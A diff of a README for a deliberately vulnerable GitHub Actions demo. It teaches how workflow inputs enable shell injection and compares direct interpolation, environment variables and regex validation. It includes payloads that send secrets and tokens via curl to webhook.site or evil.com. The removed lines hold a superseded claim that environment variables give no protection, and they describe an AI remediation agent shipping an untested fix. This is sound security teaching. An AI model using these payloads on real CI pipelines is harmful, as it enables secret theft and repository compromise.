@@ -10,23 +10,71 @@ This repository contains **intentionally vulnerable** code for educational purpo
 
 ## What is the Vulnerability?
 
-GitHub Actions allows workflows to be triggered with user-provided inputs (`workflow_dispatch`). When these inputs are used directly in `run:` steps, they can inject arbitrary shell commands—even when using environment variables.
+GitHub Actions allows workflows to be triggered with user-provided inputs (`workflow_dispatch`). When these inputs are used **directly** in `run:` steps with the `${{ }}` syntax, they can inject arbitrary shell commands.
 
-### The Problem
-
-**Both of these patterns are vulnerable:**
+### The Two Patterns
 
 ```yaml
-# Pattern 1: Direct interpolation (obviously vulnerable)
+# Pattern 1: Direct interpolation (VULNERABLE)
 run: git checkout -b "update-${{ inputs.package_name }}"
 
-# Pattern 2: Using env vars (STILL VULNERABLE!)
+# Pattern 2: Using env vars (SAFER - GitHub's official recommendation)
 run: git checkout -b "update-${PACKAGE_NAME}"
 env:
   PACKAGE_NAME: ${{ inputs.package_name }}
 ```
 
-**Why?** Because GitHub Actions evaluates `${{ ... }}` expressions **before** the shell runs, injecting the raw string value. The shell then interprets special characters like `;`, `&`, `|`, `$()`, etc.
+### The Key Difference
+
+**Direct `${{ }}` interpolation:**
+- GitHub Actions evaluates expressions at **workflow generation time**
+- The value becomes **part of the shell script itself**
+- Command injection succeeds because the shell interprets special characters
+
+**Environment variables (`env:`):**
+- GitHub Actions sets the variable before script execution
+- The value is **stored in memory as data**, not script
+- The shell treats it as a string, preventing most injection attacks
+
+**Source:** [GitHub Docs - Security Hardening for GitHub Actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions)
+
+---
+
+## Important Findings
+
+### ✅ Environment Variables DO Provide Security Benefits
+
+After testing and reviewing GitHub's official documentation:
+
+1. **GitHub officially recommends** using environment variables as a security control
+2. **It does prevent** direct command injection in most cases
+3. **But it's not sufficient alone** - input validation is still required
+
+### ⚠️ Both Approaches Are Still Needed
+
+**Best practice (from GitHub):**
+```yaml
+# Step 1: Validate input
+- name: Validate Package Name
+  run: |
+    if ! echo "$PACKAGE_NAME" | grep -qE '^@?[a-zA-Z0-9_-]+(/[a-zA-Z0-9_-]+)?$'; then
+      echo "Invalid package name"
+      exit 1
+    fi
+  env:
+    PACKAGE_NAME: ${{ inputs.package_name }}
+
+# Step 2: Use validated input safely
+- name: Install Package
+  run: npm install "$PACKAGE_NAME"
+  env:
+    PACKAGE_NAME: ${{ inputs.package_name }}
+```
+
+**Why both?**
+- Environment variables prevent script generation attacks
+- Input validation rejects malicious patterns before any processing
+- Defense-in-depth: multiple layers of security
 
 ---
 
@@ -34,35 +82,53 @@ env:
 
 This repository contains three workflows:
 
-### 1. `vulnerable.yml` - Original Vulnerable Pattern
-Direct interpolation of untrusted inputs into shell commands.
+### 1. `vulnerable.yml` - Direct Interpolation (VULNERABLE)
+Uses `${{ inputs.* }}` directly in shell commands. Command injection succeeds.
 
-### 2. `ineffective-fix.yml` - The Attempted "Fix"
-Uses environment variables (the recommended "fix" from many SAST tools), but **still vulnerable**.
+### 2. `ineffective-fix.yml` - Environment Variables Only (IMPROVED BUT INCOMPLETE)
+Uses environment variables without validation. **Significantly safer** than direct interpolation, but still missing input validation.
 
-### 3. `secure.yml` - Proper Security Fix
-Validates inputs with regex before using them.
+### 3. `secure.yml` - Complete Security Fix (SECURE)
+Uses **both** environment variables **and** input validation. This is the proper defense-in-depth approach.
+
+---
+
+## Setup
+
+### Configure GitHub Secrets
+
+The workflows use GitHub repository secrets for demonstration purposes. Set these up:
+
+1. Go to **Settings** → **Secrets and variables** → **Actions**
+2. Click **New repository secret**
+3. Add two secrets:
+
+**Secret 1:**
+- Name: `DEMO_SECRET`
+- Value: `super-secret-api-key-12345`
+
+**Secret 2:**
+- Name: `DEMO_AWS_KEY`
+- Value: `AKIAIOSFODNN7EXAMPLE`
+
+These are fake secrets for demonstration only. The workflows will use them to show how secrets can be exfiltrated.
 
 ---
 
 ## How to Test the Vulnerability
 
-### Step 1: Fork or Clone This Repository
+### Prerequisites
+- GitHub secrets configured (see Setup section above)
+- A webhook URL from https://webhook.site for testing
+- Access to this repository's Actions tab
 
-You need a GitHub repository with Actions enabled to test this.
+### Test Case 1: Direct Interpolation (Vulnerable)
 
-### Step 2: Run the Vulnerable Workflow
-
-1. Go to **Actions** tab
-2. Select **"VULNERABLE: Package Update Workflow"**
-3. Click **"Run workflow"**
-4. Enter these inputs:
-
-#### Test Case 1: Exfiltrate Secret via HTTP Request
+**Workflow:** `vulnerable.yml`
 
 **Package name:**
 ```
-foo"; curl -X POST https://webhook.site/YOUR-WEBHOOK-ID -d "secret=$DEMO_SECRET" #
+$(curl https://webhook.site/YOUR-WEBHOOK-ID?secret=$DEMO_SECRET)
 ```
 
 **Package version:**
@@ -70,20 +136,18 @@ foo"; curl -X POST https://webhook.site/YOUR-WEBHOOK-ID -d "secret=$DEMO_SECRET"
 1.0.0
 ```
 
-**What happens:**
-1. GitHub Actions evaluates `${{ inputs.package_name }}` to the literal string
-2. Shell receives: `git checkout -b "update-foo"; curl -X POST ... #-1.0.0"`
-3. The quote closes, semicolon ends the git command
-4. The curl command **executes and exfiltrates the secret**
-5. The `#` comments out the rest
+**Expected result:**
+- ✅ Command executes (you'll see curl progress in logs)
+- ✅ Webhook receives request with secret
+- ✅ Proves the vulnerability is exploitable
 
-**Result:** The secret `DEMO_SECRET=super-secret-api-key-12345` is sent to your webhook!
+### Test Case 2: Environment Variables Without Validation
 
-#### Test Case 2: Execute Arbitrary Commands
+**Workflow:** `ineffective-fix.yml`
 
 **Package name:**
 ```
-foo"; echo "pwned" > /tmp/hacked.txt && cat /tmp/hacked.txt #
+$(curl https://webhook.site/YOUR-WEBHOOK-ID?test=envvar)
 ```
 
 **Package version:**
@@ -91,16 +155,20 @@ foo"; echo "pwned" > /tmp/hacked.txt && cat /tmp/hacked.txt #
 1.0.0
 ```
 
-**What happens:**
-- Creates a file `/tmp/hacked.txt`
-- Outputs "pwned" in the workflow logs
-- Proves arbitrary command execution
+**Expected result:**
+- ❌ Command substitution does NOT execute
+- ❌ No webhook request received
+- ✅ Proves environment variables provide protection
 
-#### Test Case 3: Access GitHub Token
+**However:** This workflow still lacks input validation, which is required for complete security.
+
+### Test Case 3: Complete Security (Environment Variables + Validation)
+
+**Workflow:** `secure.yml`
 
 **Package name:**
 ```
-foo"; echo "Token: $GITHUB_TOKEN" #
+$(curl https://webhook.site/YOUR-WEBHOOK-ID?blocked=true)
 ```
 
 **Package version:**
@@ -108,174 +176,202 @@ foo"; echo "Token: $GITHUB_TOKEN" #
 1.0.0
 ```
 
-**What happens:**
-- Logs show the GitHub token (redacted in UI, but attacker could exfiltrate it)
-- Could be used to push malicious code, access private repos, etc.
+**Expected result:**
+- ❌ Workflow fails at validation step
+- ❌ No commands execute
+- ❌ No webhook request
+- ✅ Malicious input rejected before any processing
 
----
+### Test Case 4: Valid Input Still Works
 
-## Step 3: Try the "Ineffective Fix"
+**Workflow:** `secure.yml`
 
-Run the **"INEFFECTIVE FIX: Using Environment Variables"** workflow with the same malicious inputs.
-
-**Result:** The attack still works! Moving to env vars changes nothing.
-
----
-
-## Step 4: Try the Secure Workflow
-
-Run the **"SECURE: Proper Input Validation"** workflow with the same malicious inputs.
-
-**Result:** ✅ The workflow fails at the validation step with an error message:
-
+**Package name:**
 ```
-❌ ERROR: Invalid package name format
-   Package name: foo"; curl -X POST https://webhook.site/...
-   Expected format: @scope/package-name or package-name
-   Allowed characters: a-z, A-Z, 0-9, _, -, /, @
+@prefect/ui-library
 ```
 
-The malicious input is **rejected before any commands execute**.
+**Package version:**
+```
+2.1.3
+```
+
+**Expected result:**
+- ✅ Validation passes
+- ✅ Workflow completes successfully
+- ✅ Legitimate use case works as expected
 
 ---
 
-## Visual Explanation
+## Understanding the Results
 
-### How the Attack Works
+### Why Direct Interpolation Fails
 
 ```yaml
-# Workflow definition
+run: git checkout -b "update-${{ inputs.package_name }}"
+```
+
+**With input:** `$(curl evil.com)`
+
+**GitHub evaluates to:**
+```bash
+git checkout -b "update-$(curl evil.com)"
+```
+
+**Shell sees command substitution and executes:** `curl evil.com`
+
+---
+
+### Why Environment Variables Help
+
+```yaml
 run: git checkout -b "update-${PACKAGE_NAME}"
 env:
   PACKAGE_NAME: ${{ inputs.package_name }}
 ```
 
-**Step 1: User provides malicious input**
-```
-package_name: foo"; curl https://evil.com?secret=$DEMO_SECRET #
-```
+**With input:** `$(curl evil.com)`
 
-**Step 2: GitHub Actions evaluates the expression**
-```yaml
-env:
-  PACKAGE_NAME: foo"; curl https://evil.com?secret=$DEMO_SECRET #
-```
+**GitHub sets:** `PACKAGE_NAME=$(curl evil.com)` (as a literal string)
 
-**Step 3: Shell receives this command**
-```bash
-git checkout -b "update-foo"; curl https://evil.com?secret=$DEMO_SECRET #"
-                        └─┬──┘  └──────────────┬─────────────────────┘
-                    Closes quote    Malicious command executes!
-```
+**Shell expands:** Variable value is already set, treats it as string data
 
-**Step 4: Shell executes two commands**
-```bash
-Command 1: git checkout -b "update-foo"
-Command 2: curl https://evil.com?secret=super-secret-api-key-12345
-```
+**Result:** Git receives the literal string `$(curl evil.com)` as the branch name, which it rejects as invalid. **No command execution.**
+
+From GitHub's documentation:
+> "The value of the expression is stored in memory and used as a variable, and doesn't interact with the script generation process."
+
+---
+
+### Why Validation Is Still Required
+
+Even with environment variables:
+1. **Variable expansion leaks** - Input like `leaked-${DEMO_SECRET}` may expose secrets in error messages
+2. **Downstream processing** - Other tools might interpret the input differently
+3. **Defense-in-depth** - Multiple security layers are always better
+4. **Explicit rejection** - Invalid input should fail fast with clear error messages
+
+---
+
+## Comparison Matrix
+
+| Approach | Direct `${{}}` | Env Vars Only | Env Vars + Validation |
+|----------|----------------|---------------|-----------------------|
+| Command injection | ❌ Vulnerable | ✅ Protected | ✅ Protected |
+| Input validation | ❌ None | ❌ None | ✅ Enforced |
+| Secret leaks | ⚠️ High risk | ⚠️ Some risk | ✅ Minimal risk |
+| Clear error messages | ❌ No | ❌ No | ✅ Yes |
+| **Security Rating** | 🔴 Vulnerable | 🟡 Improved | 🟢 Secure |
 
 ---
 
 ## Real-World Impact
 
-This vulnerability allows an attacker to:
+This vulnerability allows attackers to:
 
-1. **Steal secrets** - Access `GITHUB_TOKEN`, AWS keys, API tokens, etc.
-2. **Push malicious code** - Use the token to commit backdoors
+1. **Steal secrets** - Access `GITHUB_TOKEN`, AWS keys, API tokens
+2. **Push malicious code** - Use stolen tokens to commit backdoors
 3. **Access private repositories** - Clone and exfiltrate source code
 4. **Compromise CI/CD pipeline** - Poison build artifacts
-5. **Lateral movement** - Use stolen credentials to attack other systems
+5. **Lateral movement** - Use stolen credentials for further attacks
+
+**This is a CRITICAL security issue when using direct interpolation.**
 
 ---
 
-## Why Environment Variables Don't Fix This
+## The Correct Fix: Defense in Depth
 
-Many developers (and SAST tools) incorrectly believe that moving to environment variables prevents injection:
+### Step 1: Use Environment Variables
 
-**Myth:** "Environment variables are safe because they're not directly in the shell command"
-
-**Reality:** The shell still expands `${PACKAGE_NAME}`, and the **value** of that variable contains the malicious payload. The injection happens during variable expansion, not during expression evaluation.
-
-### The Execution Flow
-
-```
-1. GitHub Actions: ${{ inputs.package_name }} → "foo; curl evil.com"
-2. Environment:    PACKAGE_NAME="foo; curl evil.com"
-3. Shell script:   git checkout -b "update-${PACKAGE_NAME}"
-4. Shell expands:  git checkout -b "update-foo; curl evil.com"
-5. Shell parses:   TWO COMMANDS (git + curl)
-6. Attack succeeds ✗
-```
-
-**No escaping happens at any step!**
-
----
-
-## The Proper Fix: Input Validation
-
-The secure workflow validates inputs using regex:
+Follow GitHub's official recommendation to prevent script generation attacks:
 
 ```yaml
-- name: Validate Inputs
-  run: |
-    # Only allow safe characters in package names
-    if ! echo "$PACKAGE_NAME" | grep -qE '^@?[a-zA-Z0-9_-]+(/[a-zA-Z0-9_-]+)?$'; then
-      echo "❌ Invalid package name"
-      exit 1
-    fi
+env:
+  PACKAGE_NAME: ${{ inputs.package_name }}
+run: npm install "$PACKAGE_NAME"
+```
 
-    # Only allow semantic version format
-    if ! echo "$PACKAGE_VERSION" | grep -qE '^[0-9]+\.[0-9]+\.[0-9]+'; then
-      echo "❌ Invalid version"
+### Step 2: Add Input Validation
+
+Whitelist allowed characters and formats:
+
+```yaml
+- name: Validate Input
+  run: |
+    if ! echo "$PACKAGE_NAME" | grep -qE '^@?[a-zA-Z0-9_-]+(/[a-zA-Z0-9_-]+)?$'; then
+      echo "❌ Invalid package name: $PACKAGE_NAME"
       exit 1
     fi
   env:
     PACKAGE_NAME: ${{ inputs.package_name }}
-    PACKAGE_VERSION: ${{ inputs.package_version }}
 ```
 
-**Now the attack is blocked:**
-```
-Input: foo"; curl evil.com
-Regex: ^@?[a-zA-Z0-9_-]+(/[a-zA-Z0-9_-]+)?$
-Match: NO (contains quotes, semicolon, spaces)
-Result: Workflow exits with error before any git/curl commands run
+### Step 3: Use Both Together
+
+```yaml
+- name: Validate Package Name
+  run: |
+    if ! echo "$PKG" | grep -qE '^@?[a-zA-Z0-9_-]+(/[a-zA-Z0-9_-]+)?$'; then
+      echo "❌ Invalid package name"
+      exit 1
+    fi
+  env:
+    PKG: ${{ inputs.package_name }}
+
+- name: Install Package (Safe)
+  run: npm install "$PKG"
+  env:
+    PKG: ${{ inputs.package_name }}
 ```
 
 ---
 
 ## Alternative Secure Solutions
 
-### Option 1: Use `actions/github-script` (Best for complex workflows)
+### Option 1: Use `actions/github-script`
+
+Avoid shell entirely by using JavaScript:
 
 ```yaml
 - uses: actions/github-script@v7
   with:
     script: |
       const { exec } = require('@actions/exec');
-      await exec.exec('git', ['checkout', '-b', branchName]);
+      await exec.exec('npm', ['install', context.payload.inputs.package_name]);
 ```
 
-**Why it's secure:** Arguments are passed as an array, not a shell string. No shell = no shell injection.
+**Why it's secure:** Arguments passed as array, no shell interpretation.
 
-### Option 2: Use `printf %q` for shell escaping
+### Option 2: Restrict Workflow Triggers
 
-```yaml
-run: |
-  SAFE_NAME=$(printf %q "$PACKAGE_NAME")
-  git checkout -b "update-${SAFE_NAME}"
-env:
-  PACKAGE_NAME: ${{ inputs.package_name }}
-```
-
-**Why it's secure:** `printf %q` escapes special characters. However, this makes ugly branch names with backslashes.
-
-### Option 3: Restrict workflow triggers
-
-Only allow trusted users (repository maintainers) to trigger the workflow:
+Only allow trusted users to trigger workflows:
 - Use branch protection rules
 - Require CODEOWNERS approval
-- Don't expose `workflow_dispatch` to external contributors
+- Don't expose `workflow_dispatch` to untrusted contributors
+
+---
+
+## Key Takeaways
+
+### ✅ What Works
+
+1. **Environment variables** - GitHub's official security recommendation
+2. **Input validation** - Whitelist allowed patterns
+3. **Both together** - Defense-in-depth approach
+4. **Safe APIs** - Use `actions/github-script` when possible
+
+### ❌ What Doesn't Work
+
+1. **Direct interpolation alone** - Highly vulnerable
+2. **Trusting user input** - Always validate
+3. **Relying on one control** - Use multiple security layers
+
+### 🎯 The Bottom Line
+
+- **Direct `${{ }}` interpolation is vulnerable** ❌
+- **Environment variables provide documented protection** ✅
+- **Input validation is still required** ✅
+- **Use both for complete security** ✅✅
 
 ---
 
@@ -283,85 +379,37 @@ Only allow trusted users (repository maintainers) to trigger the workflow:
 
 Run each test case and verify results:
 
-- [ ] **Test 1:** Vulnerable workflow + malicious input → Secret exfiltrated
-- [ ] **Test 2:** Ineffective fix + malicious input → Still vulnerable
-- [ ] **Test 3:** Secure workflow + malicious input → Input rejected
-- [ ] **Test 4:** Secure workflow + valid input → Workflow succeeds
-
----
-
-## Setting Up Your Own Test
-
-### 1. Get a Webhook URL
-
-Visit [webhook.site](https://webhook.site/) to get a unique URL for testing HTTP requests.
-
-### 2. Craft Your Payload
-
-Replace `YOUR-WEBHOOK-ID` with your actual webhook:
-
-```
-foo"; curl -X POST https://webhook.site/YOUR-WEBHOOK-ID -d "secret=$DEMO_SECRET&token=$GITHUB_TOKEN" #
-```
-
-### 3. Run the Workflow
-
-Use this payload in the **Package name** field.
-
-### 4. Check the Webhook
-
-Visit webhook.site and see if your request arrived with the secret!
-
----
-
-## Why This Matters
-
-This vulnerability was found in the **Prefect** project (a real open-source workflow orchestration tool). The AI remediation agent:
-1. ✅ Correctly identified the vulnerability
-2. ✅ Correctly understood the attack vector
-3. ❌ Applied an ineffective fix (moving to env vars)
-4. ❌ Never tested if the fix actually prevented the attack
-
-This demonstrates:
-- SAST tools can provide incorrect remediation advice
-- "Fixing" without testing is dangerous
-- AI agents need adversarial validation
-
----
-
-## Key Takeaways
-
-### ❌ What DOESN'T Work
-
-- Using environment variables instead of direct interpolation
-- Double-quoting variables
-- Trusting SAST tool recommendations without verification
-
-### ✅ What DOES Work
-
-- **Input validation with regex** (whitelist approach)
-- **Using safe APIs** (github-script with argument arrays)
-- **Shell escaping** (printf %q, though creates ugly output)
-- **Restricting workflow triggers** (defense in depth)
+- [ ] **Test 1:** Direct interpolation (`vulnerable.yml`) → Secret exfiltrated ❌
+- [ ] **Test 2:** Env vars only (`ineffective-fix.yml`) → Injection blocked ✅
+- [ ] **Test 3:** Complete fix (`secure.yml`) + malicious input → Input rejected ✅
+- [ ] **Test 4:** Complete fix (`secure.yml`) + valid input → Workflow succeeds ✅
 
 ---
 
 ## References
 
-- [GitHub Actions Security Hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
-- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
-- [GitHub Security Lab: Actions Command Injection](https://securitylab.github.com/research/github-actions-untrusted-input/)
-
----
-
-## License
-
-MIT - Use this for educational purposes. Do not use vulnerable patterns in production!
+- [GitHub Docs: Security Hardening for GitHub Actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions)
+- [GitHub Docs: Secure Use Reference](https://docs.github.com/en/actions/reference/security/secure-use)
+- [OWASP: Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
 
 ---
 
 ## Questions?
 
-This vulnerability is **real** and **exploitable**. If you're still skeptical, run the test cases above and see the secrets get exfiltrated!
+**Q: Is direct interpolation always vulnerable?**
+A: Yes, when using untrusted input with `${{ }}` syntax directly in `run:` steps.
 
-For more details, see the [trajectory analysis document](https://github.com/your-username/github-actions-injection-demo/blob/main/ANALYSIS.md).
+**Q: Do environment variables completely fix the issue?**
+A: They provide significant protection but input validation is still required for complete security.
+
+**Q: Why do some SAST tools say environment variables don't help?**
+A: Some tools may have outdated guidance. GitHub's official documentation confirms environment variables are a recommended security control.
+
+**Q: Should I use both environment variables AND validation?**
+A: Yes! Defense-in-depth is always the best approach.
+
+---
+
+## License
+
+MIT - Use this for educational purposes. Always follow security best practices in production!
